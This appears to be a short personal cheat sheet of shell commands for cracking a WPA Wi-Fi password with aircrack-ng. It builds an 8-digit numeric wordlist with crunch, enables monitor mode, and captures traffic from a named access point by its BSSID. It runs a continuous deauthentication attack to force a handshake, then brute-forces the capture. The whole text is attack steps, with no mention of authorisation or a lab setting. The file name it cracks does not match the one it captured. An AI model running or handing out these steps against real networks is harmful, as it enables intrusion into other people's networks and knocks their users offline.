### Install software

sudo apt install aircrack-ng crunch

### Generate dict
crunch 8 8 1234567890 -o /path/to/file/dict.lst

### Process
sudo iwconfig # See interface
sudo airmon-ng start wlp3s0

sudo airodump-ng -c 11 --bssid B8:EC:A3:FC:BD:F8 -w test wlp3s0
sudo aireplay-ng -0 0 -a B8:EC:A3:FC:BD:F8 wlp3s0

### Up interface and run bruteforce
sudo systemctl enable wpa_supplicant.service
aircrack-ng work-01.cap -w dict.lst